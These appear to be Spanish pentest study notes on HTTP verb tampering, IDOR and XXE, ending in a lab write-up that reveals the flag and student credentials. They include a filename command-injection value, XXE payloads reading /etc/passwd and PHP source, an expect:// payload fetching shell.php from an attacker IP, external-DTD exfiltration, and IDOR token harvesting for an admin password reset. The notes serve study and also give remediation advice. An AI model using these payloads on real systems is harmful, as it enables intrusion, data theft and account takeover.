
## HTTP Verb Tampering 

> El HTTP Verb Tampering es una técnica de evasión que explota métodos HTTP alternativos (como HEAD, PUT o DELETE) para eludir controles de seguridad o acceder a recursos restringidos.
> GET: Solicita una representación del recurso especificado, sin modificarlo.
> HEAD: Igual que GET, pero sin el cuerpo de la respuesta.
> POST: Envía datos al servidor, usualmente causando cambios o efectos secundarios.
> PUT: Reemplaza completamente el recurso especificado con el contenido enviado.
> DELETE: Elimina el recurso especificado.
> CONNECT: Establece un túnel hacia el servidor de destino.
> OPTIONS: Informa sobre las opciones de comunicación disponibles para el recurso.
> TRACE: Realiza una prueba de bucle de mensaje hasta el recurso objetivo.
> PATCH: Aplica modificaciones parciales a un recurso.
<img width="648" height="380" alt="image" src="https://github.com/user-attachments/assets/027cf822-f119-421f-bec8-7ecba22e40dd" />



### Bypassing Basic Authentication
Comprobar el tipo de solicitudes que acepta, para ejecutar acciones las cuales estan restringidas unicamente a cierto tipo de cabeceras (Mala configuracion)
```
curl -i -X OPTIONS http://SERVER_IP:PORT/

nmap -p 41414 --script http-methods 94.237.54.192
```

### Bypassing Security Filters
Al estar protegido contra inyeccion de comandos o caracteres especiales, pero igualmente en solo el Verb POST, se podria Bypassear modificando la peticion
En este caso incluso permitiendo la Ejecucion Remota de Comandos

```
POST /index.php HTTP/1.1
Host: 94.237.54.192:41414
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-CO,en;q=0.7,en-US;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.54.192:41414/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

filename=file1%3B+touch+file2%3B

o

filename=file; cp /flag.txt ./
```

**Recomendaciones Para el Cliente - Verb Tampering Prevention**
Esta configuración suele presentarse en todos los CMS en:

- Apache en _.htaccess_ con `<Limit GET>`
- Tomcat en _web.xml_ con `<http-method>GET</http-method>`
- ASP.NET en _web.config_ con `<allow verbs="GET" roles="admin">`

Las remediaciones para esto son usar en:

- Apache: `<LimitExcept>` en lugar de `<Limit>`
- Tomcat: `<http-method-omission>` en lugar de `<http-method>`
- ASP.NET: usar `add`/`remove` o reglas más amplias para todos los métodos

______________________________________________________________________________________
______________________________________________________________________________________

## Insecure Direct Object References (IDOR)

> Una vulnerabilidad IDOR (Insecure Direct Object Reference) ocurre cuando una aplicación permite el acceso directo a objetos mediante identificadores manipulables sin un control de acceso adecuado, lo que puede permitir a atacantes ver, modificar o eliminar recursos de otros usuarios.
---
### Identifying IDORs
El primer paso para explotar IDOR es identificar referencias directas a objetos, como:
- `?uid=1`  
- `?filename=file_1.pdf`
Estos parámetros pueden encontrarse en URLs, APIs, cookies, etc.
Basta con cambiar el valor (ej. `uid=2`) o usar fuzzing para detectar acceso no autorizado a otros datos.

### Llamadas AJAX y código frontend
Frameworks JavaScript a veces exponen funciones sensibles según el rol del usuario. Revisando el código JS se pueden descubrir endpoints ocultos.
```js
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
Aunque esta función no se invoque como usuario normal, puede ejecutarse manualmente y ser vulnerable si no hay control en el backend.

### Hash/codificación en referencias
Algunas aplicaciones usan codificación (ej. Base64) o hashing (MD5, SHA) para ocultar referencias.
Ejemplo codificado (Base64):
- URL: `?filename=ZmlsZV8xMjMucGRm` → `file_123.pdf`
Si no hay validación de acceso, puede modificarse:
- Nueva URL: `?filename=ZmlsZV8xMjQucGRm` → `file_124.pdf`
Ejemplo con hash:
```js
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
Si se puede identificar el algoritmo, se pueden generar hashes de otros archivos.

### Comparación entre usuarios
Registrar múltiples usuarios permite analizar diferencias en los parámetros.
Ejemplo de respuesta API:
```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```
Podemos intentar acceder como otro usuario (`users/2`) para ver si se devuelven datos sin validación.
---




**Recomendaciones Para el Cliente - IDOR Prevention**

Implementar un sistema de Control de Acceso Basado en Roles (Role-Based Access Control (RBAC))

________________________________________________________________________________
________________________________________________________________________________

## XML External Entity (XXE) Injection

> XML (eXtensible Markup Language) es un lenguaje de marcado diseñado para almacenar e intercambiar datos estructurados. A diferencia de HTML, no está enfocado en visualización sino en representar la estructura de los datos.
> Es posiblemente vulnerable cualquier aplicacion web que envie datos en formato XML

Ejemplo básico:
```xml
<email>
  <sender>john@example.com</sender>
  <body>Hello</body>
</email>
```

---

### Componentes clave de XML

| Llave       | Definición                                                                 | Ejemplo                             |
|-------------|----------------------------------------------------------------------------|-------------------------------------|
| **Tag**     | Claves de un documento XML, entre `<` y `>`                                | `<date>`                            |
| **Entity**  | Variables XML, encerradas entre `&` y `;`                                   | `&lt;`                              |
| **Element** | Elemento raíz o secundario con valor entre una etiqueta de inicio y fin    | `<date>01-01-2022</date>`          |
| **Attribute** | Especificaciones dentro de etiquetas, usadas por el analizador XML       | `version="1.0" encoding="UTF-8"`    |
| **Declaration** | Línea inicial que define versión y codificación del XML               | `<?xml version="1.0" encoding="UTF-8"?>` |

---

### ¿Qué es un DTD?

El **DTD (Document Type Definition)** define la estructura de un documento XML. Puede incluirse dentro del XML o como archivo externo.

Ejemplo embebido:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

También puede referenciarse de forma externa:
```xml
<!DOCTYPE email SYSTEM "email.dtd">
```

---

### Entidades XML

Las entidades actúan como variables. Pueden definirse directamente o apuntar a archivos externos:

```xml
<!ENTITY company "Inlane Freight">
<!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
```

Estas entidades pueden usarse en el documento con `&company;` o `&signature;`. Al analizar el XML, el servidor sustituye estas entidades por su contenido.

### Explotación de XXE

1. **Entidad Externa para Divulgación de Archivos Locales**:
   Inyectando una entidad externa que apunte a un archivo local, como `/etc/passwd`:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```

2. **Uso de `php://filter` para Leer Código Fuente**:
   Si la aplicación está en PHP, se puede usar `php://filter` para leer archivos codificados en base64:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```

3. **Ejecución Remota de Código (RCE)**:
   Si la aplicación permite, el filtro `expect://` en PHP puede ejecutar comandos remotos, como descargar un shell:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```
4. **Evasión de Contenido con CDATA**
En otros casos se usal filtros php como file:// o expect://, pero en caso de extraer cualquier otro tipo de data lo ideal es almacenarlos e un archivo CDATA, donde en este caso el servidor tomara la informacion como contenido sin procesar.
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

5. **XML Parameter Entities**
Aunque aveces esto tiene sus lmitaciones al hacer el llamado a entidades internas, para solucionar esto, lo que se suele hacer es:

```xml
<!ENTITY joined "%begin;%file;%end;">
```
Esta entidad es guardada en un archivo .dtd (ej: xxe.dtd), al cual a través de la peticion se le hara el llamado a mi servidor con el archivo .dtd, y luego en la peticion XML se haria el llamado a la entidad existente dentro del archivo. Evitando tener que encodear el codigo fuente del archivo sin necesidad de encodearlo en base64.
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
6. **XEE Blind Basado en Errores**
Este tipo de XEE se hace forzando la salida de errores que hagan referencia a alguna entidad, ingresando parametros mal formados o incompletos, en busca de errores que nos revelen algo. Donde luego de identificar alguno valido se puede hacer referencia a una entidad externa junto con el parametro obtenido en el error.
<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/10a1c58f-faac-4c83-a965-9b82001775db" />


En este caso se crea un payload con una carga util similar a esta:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Y luego llamando a el servidor con el dtd.
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
7. **Out-of-band (OOB) Data Exfiltration**

### Herramienta Automatizada XXE: https://github.com/enjoiz/XXEinjector
Para usar la herramienta primero se debe copiar el repositorio `git clone https://github.com/enjoiz/XXEinjector.git`
Y luego se debe almacenar la petición obtenida de BurpSuite (El XML no debe estar completo, unicamente la primera linea y luego agregar **XXEINJECT**) en un archivo ej: "_**xxe.req**_"

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
Para ejecutarlo se debe tenera la siguiente estructura 
```
ruby XXEinjector.rb --host=10.10.2.30(MiIP) --httpport=8000 --file=/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
```
--host=[tu IP]    + Dirección IP donde escuchas las conexiones (tu IP en tun0, por ejemplo).
--httpport=8000    + Puerto donde tu servidor HTTP está corriendo para recibir conexiones OOB.
--file=/tmp/xxe.req    + Ruta del archivo que contiene la carga XML maliciosa que será enviada.
--path=/etc/passwd    + Ruta del archivo remoto que quieres leer en la máquina víctima.
--oob=http    + Usa la técnica OOB (Out-Of-Band) vía HTTP para exfiltrar los datos.
--phpfilter    + Aplica un filtro en base64 para evitar errores de procesamiento (útil en entornos PHP).
___________________________________________________________________________________________________________
--oob=dns	+ Usa DNS en vez de HTTP para canales OOB alternativos
--path=/proc/self/environ	+ Ruta alternativa útil para buscar variables sensibles o inyecciones
--file=otra_carga.xml	+ Cambia la carga si necesitas otro vector o endpoint
--no-base64	+ Desactiva filtros base64 si no los necesitas
--timeout=10	+ Tiempo de espera personalizado para respuestas OOB
```

Para consultar la salida, esta se almacena en los logs de la carpeta de la herramienta: `cat Logs/10.129.201.94/etc/passwd.log `

---

### Consejos Adicionales

- XXE también puede usarse para **SSRF** (Server Side Request Forgery) al acceder a puertos locales.
- Los **servidores modernos** protegen contra XXE mediante configuraciones específicas (desactivar DTDs, por ejemplo).

## Recomendaciones

### Recomendaciones para la Prevención de Vulnerabilidades XXE (XML External Entity)

### Actualización de bibliotecas y componentes XML

- **Utilizar versiones actualizadas y seguras de bibliotecas XML.**
- **Evitar el uso de funciones obsoletas**, como `libxml_disable_entity_loader` en PHP, la cual ha sido desaprobada desde PHP 8.0.0.
- **Revisar y actualizar cualquier componente que procese XML**, incluyendo:
  - Bibliotecas API como SOAP.
  - Procesadores de documentos como SVG o PDF.
- **Verificar la seguridad de los módulos de Node.js u otros gestores de paquetes**, y reemplazar aquellos que estén obsoletos.

### Uso de configuraciones XML seguras

- **Configurar adecuadamente los analizadores XML** para deshabilitar funciones que puedan ser explotadas:
  - **Deshabilitar Document Type Definitions (DTDs).**
  - **Deshabilitar entidades externas (External Entities).**
  - **Deshabilitar procesamiento de entidades de parámetro.**
  - **Deshabilitar soporte para XInclude.**
  - **Prevenir bucles de referencias de entidades.**

### Manejo de errores y excepciones

- **Deshabilitar la visualización de errores en tiempo de ejecución en entornos de producción.**
- **Implementar un manejo robusto de excepciones** para evitar la exposición de información sensible mediante errores de análisis XML.

### Considerar formatos alternativos a XML

- **Siempre que sea posible, utilizar formatos de datos más seguros** como JSON o YAML.
- **Evitar el uso de APIs basadas en XML** (como SOAP) y optar por **APIs modernas basadas en JSON** (como REST).

### Implementación de WAF (Web Application Firewall)

- **Utilizar un WAF como capa de defensa adicional** para detectar y bloquear intentos de explotación XXE.
- **No depender exclusivamente del WAF; la validación debe realizarse también en el backend.**

### Referencias adicionales

- **Se recomienda consultar la Hoja de Referencia de Prevención XXE de OWASP** para una guía detallada sobre bibliotecas vulnerables y prácticas seguras:  
  https://owasp.org/www-project-cheat-sheets/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html











  __________________________________










# Caja Final Reuelta

> Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
> HTB{m4573r_w3b_4774ck3r}

1. Inicialmente se nos proporcionaron las credenciales para ingresar a la plataforma objetivo "Authenticate to 94.237.61.242:38611 with user "_htb-student_" and password "_Academy_student!_""

<img width="1079" height="647" alt="image" src="https://github.com/user-attachments/assets/ddb40ab4-3168-49bf-b415-a325d8a1534c" />

Al ingresar siempre suelo revisar el codigo fuente, en el cual se evidencian algunos path del usuario, ademas de una funcion que trae algunos parametros de usuario "/api.php/user/${$.cookie("uid")}"

<img width="1439" height="853" alt="image" src="https://github.com/user-attachments/assets/032e88c8-53a4-42bd-b8b7-65cf41846ef4" />

Desde el inicio se estaba hacendo la captura de paquetes donde se observo la peticion que se ve anteriormente

<img width="664" height="202" alt="image" src="https://github.com/user-attachments/assets/fd6ef357-28a4-49da-8700-141303898c1b" />

Donde al ser un GET se puede hacer una peticion directamente desde la web, donde se evidencia que con este ID se pueden enumerar usuarios, debido a esto se probo este IDOR con valores del 0 al 100

<img width="882" height="137" alt="image" src="https://github.com/user-attachments/assets/4e129018-75ab-4cec-9d54-66ac36037c49" />

Aqui se podian enumerar la informacion desde un script en bash o directamente en Burpsuite
```bash
for id in $(seq 0 100); do
  curl -s http://94.237.61.242:38611/api.php/user/$id
done
```
<img width="1446" height="847" alt="image" src="https://github.com/user-attachments/assets/246e4981-3b13-4862-9f1f-18487d481008" />

Ya en este punto y debido a que se nos pedia elevar privilegios, el paso obvio era buscar al usuario "admin" o "Administrador" en este caso:

<img width="1012" height="526" alt="image" src="https://github.com/user-attachments/assets/1386be04-ff30-4109-ae95-b79698d36310" />

Donde efectivamente hay un usuario Administrator, pero la cuestion era como acceder a la cuenta, para esto yo habia probado ir a "settings" donde aparece una interfaz para cambiar la contraseña, por lo que lo probe desde la cuenta la cual tenia acceso y capture la petición. Obteniendo asi la estructura enviada al servidor para camiar la contraseña, donde se tiene el _uid_, un _token_ y la _contraseña_, de la siguiente manera:

<img width="1206" height="279" alt="image" src="https://github.com/user-attachments/assets/96e22d6d-7f44-4e37-ae81-2a10236f928b" />

Durante esta captura tambien se evidencio el funcionamiento de la API la cual traia el token, donde igualmente era vulnerable a IDOR:
<img width="668" height="210" alt="image" src="https://github.com/user-attachments/assets/74d971a9-44b9-4063-813b-7e2cecfa240f" />

Para lo cual use un script similar al anterior para extraer todos los tokens, para facilitar un ataque automatico:

```bash
┌──(kali㉿kali)-[~/Desktop/]
└─$ for id in $(seq 0 100); do
  curl -s http://94.237.61.242:38611/api.php/token/$id | grep -oP '"token"\s*:\s*"\K[^"]+'
done > tokens.txt
          
┌──(kali㉿kali)-[~/Desktop/]
└─$ head tokens.txt 
e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c
e51a7dc6-17ac-11ec-8e1f-df8a04f4691d
e51a7df8-17ac-11ec-8e20-37f52352c5ab
e51a7e20-17ac-11ec-8e21-eb442066c04d
e51a7e48-17ac-11ec-8e22-af3c03bc0d85
e51a7e70-17ac-11ec-8e23-ff853a7a4767
e51a7ede-17ac-11ec-8e24-d762f0e7e4eb
e51a7f06-17ac-11ec-8e25-d30db175b4a8
e51a7f2e-17ac-11ec-8e26-c320c60b942f
e51a7f56-17ac-11ec-8e27-2b4b9df74ed7
```
Ya con todos los tokens y usuarios se probo con todos los _uid_ y _tokens_ cambiar la contraseña de todos los usuarios, de esta manera:
<img width="1415" height="586" alt="image" src="https://github.com/user-attachments/assets/29e34b11-2146-475a-885f-67fdecd86793" />
Esto arrojaba el error "Access Denied"
<img width="1094" height="186" alt="image" src="https://github.com/user-attachments/assets/650d0760-bce3-4a7b-b134-8d951567fde7" />

Por lo que en este punto se probo con otros metodos para hacer Verb Tampering, probando en lugar de POST usar el metodo GET, donde en este caso si funciono correctamente
<img width="1149" height="236" alt="image" src="https://github.com/user-attachments/assets/ef197890-436f-4a04-b4c7-481fabfe2e2f" />

Ya basicamente se habian escalado privilegios al poder ingresar a la cuenta del usuario Administrador, donde respecto a los otros usuarios, lo unico que cambiaba era la seccion del recuadro rojo, donde se podian crear eventos:
<img width="1302" height="894" alt="image" src="https://github.com/user-attachments/assets/154d819b-1b4e-4570-accd-a2513f384c9a" />
<img width="1297" height="679" alt="image" src="https://github.com/user-attachments/assets/b3ca0bc0-284c-46d4-a70b-f989cb3f24bc" />

Igualmente se capturo la peticion, donde nos encontramos con una peticion en formato XML
<img width="788" height="445" alt="image" src="https://github.com/user-attachments/assets/2d235658-d2e4-44ce-bc9e-5891077ee75f" />
Donde con un ejemplo simple se evidencia que es vulnerable a XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY evento "Hola mundo">
]>
            <root>
            <name>&evento;</name>
            <details>Detalles</details>
            <date>2025-08-26</date>
            </root>
```

<img width="1241" height="482" alt="image" src="https://github.com/user-attachments/assets/ad6e7c93-ef24-499f-9476-7bd0303b3075" />

Ya con esta evidencia se trato de traer directamente la **flag.php** con `<!ENTITY evento SYSTEM "file:///flag.php">`, pero por ser un php creo yo, no entregaba la salida en texto plano, por lo que no traia nada, en ese caso se hizo el llamado con _php://_, trayendo efectivamente la flag requerida:

<img width="1877" height="507" alt="image" src="https://github.com/user-attachments/assets/5b182253-4651-46e1-905b-2696bf4a3f8a" />

<img width="997" height="454" alt="image" src="https://github.com/user-attachments/assets/f5a124d1-c02a-4b64-b173-5d8c35a96cf1" />


  
